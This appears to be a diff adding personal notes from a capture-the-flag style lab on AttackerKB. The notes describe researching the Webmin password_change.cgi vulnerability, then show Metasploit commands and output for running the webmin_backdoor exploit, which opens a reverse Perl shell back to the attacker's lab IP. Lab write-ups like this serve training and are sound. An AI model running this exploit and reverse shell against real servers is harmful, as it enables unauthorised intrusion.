@@ -1,0 +1,53 @@
+Ever caught wind of a new vulnerability on Twitter or found something weird when examining a box? Fear no more, AttackerKB is here to make sense of it all! Throughout this room, we'll be examining how we can leverage AttackerKB both as an attacker and defender to gain further insight into the ever-changing landscape of vulnerabilities.
+
+
+
+
+Now that we've discovered a strange service running on our target, let's move onto further research to discover possible exploits and how valuable they might be with AttackerKB.
+
+
+
+First, let's navigate to AttackerKB! For our purposes, think of AttackerKB as similar to Exploit-DB but with a higher degree of information surrounding vulnerabilities and the exploits therein associated with them. 
+
+The AKB dashboard at the time of writing. Note, we won't have to log in for what we're doing. That being said, logging in (via GitHub OAuth) allows us to post and contribute to discussions surrounding vulnerabilities.
+
+AKB allows us to search for various vulnerabilities via the search bar at the top right of the site. Search now for 'Webmin' and click on 'password_change.cgi'
+
+Take a look through the Assessments for this vulnerability. As an attacker, we can use the information posted here by other members to determine how value an exploit might be and any tweaks we might have to make to exploit code. Similarly, as a defender we can leverage these comments to gain additional situational information for vulnerabilities, allowing us to gauge how quickly we need to patch them. Which version of Webmin is immediately vulnerable to this exploit?
+
+
+
+
+
+
+
+*in msfconsole
+
+
+search webmin
+
+use 2
+
+
+*derp, set SSL true
+
+
+
+
+
+msf6 exploit(linux/http/webmin_backdoor) > run
+
+[*] Started reverse TCP handler on 10.2.26.235:4444 
+[*] Configuring Automatic (Unix In-Memory) target
+[*] Sending cmd/unix/reverse_perl command payload
+[*] Command shell session 1 opened (10.2.26.235:4444 -> 10.10.18.163:50024) 
+
+
+
+
+
+Want to get even more out of AttackerKB? Check out the AKB Explorer by Horshark! Written in python, AKB Explorer provides similar functionality to Searchsploit, expanded to encompass the features of AKB. Using this tool, you can search by name, CVE, and username for posts! Check it out here: Link
+
+
+
+
